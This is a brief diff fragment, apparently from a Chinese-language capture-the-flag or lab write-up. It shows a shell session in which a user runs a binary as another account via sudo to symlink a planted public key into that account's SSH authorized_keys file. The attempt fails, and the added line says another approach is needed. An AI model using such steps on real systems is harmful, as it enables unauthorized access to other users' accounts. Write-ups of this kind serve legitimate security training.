@@ -552,3 +552,4 @@ qc2000@Pom:/tmp$ chmod 777 /tmp/mykey.pub
 qc2000@Pom:/tmp$ sudo -u terra536 /home/terra536/ln -sf /tmp/mykey.pub /home/terra536/.ssh/authorized_keys
 ln: /home/terra536/.ssh/authorized_keys: No such file or directory
 ```
+那我们只能换一个思路了，
